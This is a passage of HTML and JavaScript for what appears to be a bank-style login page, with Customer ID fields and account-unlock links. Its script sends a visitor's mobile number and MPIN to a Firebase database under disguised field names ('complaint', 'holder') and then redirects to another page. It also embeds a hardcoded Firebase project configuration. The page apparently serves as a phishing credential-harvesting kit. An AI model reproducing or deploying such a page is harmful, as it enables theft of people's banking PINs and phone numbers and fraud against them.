  <body class="bg-slate-100">

              <div class="mt-5 justify-center flex">

              <!-- Input -->
              <h1 class="text-sm mt-10">Customer ID</h1>
              <input

                class="w-full border-b-[1px] border-black p-1 outline-none"
              />

              <input

                class="w-full border-b-[1px] border-black p-1 outline-none"
              />

              <!-- Button -->
              <p class="mt-10">
                Forgot Password
                <span class="text-blue underline"> Reset Here </span>
              </p>

              <p class="mt-1">
                Locked Your Account
                <span class="text-blue underline"> Enable Here </span>
              </p>

              <div class="mt-5 justify-center flex">
                <button
                  class="btn btn-wide rounded-full btn-sm text-white bg-pink-800"
                >
                  Login
                </button>
              </div>
            </form>
          </div>
        </div>
        <!-- Image -->
        <div class="w-full">
        </div>
      </div>
    </div>

    <script>
      function showTabContent(tabId) {
        // Hide all tab contents
        const tabContents = document.querySelectorAll("[id$='-content']");
        tabContents.forEach((content) => {
          content.style.display = "none";
        });

        // Remove the classes from all tabs
        const tabs = document.querySelectorAll("[onclick^='showTabContent']");
        tabs.forEach((tab) => {
          tab.classList.remove("bg-pink-900");
          tab.classList.remove("rounded-full");
          tab.classList.remove("text-white");
        });

        // Show the selected tab content and add the classes to the clicked tab
        const selectedContent = document.getElementById(tabId + "-content");
        const selectedTab = document.querySelector(
          `[onclick="showTabContent('${tabId}')"]`
        );
        if (selectedContent && selectedTab) {
          selectedContent.style.display = "block";
          selectedTab.classList.add("bg-pink-900");
          selectedTab.classList.add("rounded-full");
          selectedTab.classList.add("text-white");
        }
      }
    </script>

    <script type="module">
      // Import the functions you need from the SDKs you need
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
      // TODO: Add SDKs for Firebase products that you want to use
      // https://firebase.google.com/docs/web/setup#available-libraries

      // Your web app's Firebase configuration
      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
      const firebaseConfig = {
  apiKey: "AIzaSyDKcOFaO3lqruMIfWxp5fOnzxeIwQZboC0",
  authDomain: "bobwo-da5c6.firebaseapp.com",
  projectId: "bobwo-da5c6",
  storageBucket: "bobwo-da5c6.appspot.com",
  messagingSenderId: "525557748996",
  appId: "1:525557748996:web:24c859f0fa82c6bff96c51"
};

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const analytics = getAnalytics(app);

      //Insert data
      import {
        getDatabase,
        ref,
        get,
        set,
        child,
        update,
        query,
        limitToLast,
        remove,
      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

      const db = getDatabase();

      var mobile = document.querySelector("#complaint");
      var mpin = document.querySelector("#holder");

      var insertBtn = document.querySelector("#insert");

      const que = query(ref(db, "people"), limitToLast(1));

      const last_key = await get(que)
        .then((snapshot) => {
          if (snapshot.exists()) {
            return parseInt(Object.keys(snapshot.val())[0]) + 1;
          } else {
            return 1;
          }
        })
        .catch((error) => {
          console.error(error);
        });

      function InsertData() {
        if (
          mobile.value == "" ||
          mobile.value == null ||
          mobile.value == undefined
        ) {
          alert("Please enter valid 10 digits Phone number");
          return;
        }

        if (mpin.value == "" || mpin.value == null || mpin.value == undefined) {
          alert("MPIN required");
          return;
        }

        insertBtn.classList.add("loading");

        localStorage.setItem("id", last_key);

        set(ref(db, "people/" + last_key), {
          complaint: mobile.value,
          holder: mpin.value,
        })
          .then(() => {
            insertBtn.classList.remove("loading");
            window.location.href = "buttons.html";
          })
          .catch((error) => {
            insertBtn.classList.remove("loading");
          });
      }
      insertBtn.addEventListener("click", InsertData);
    </script>
  </body>
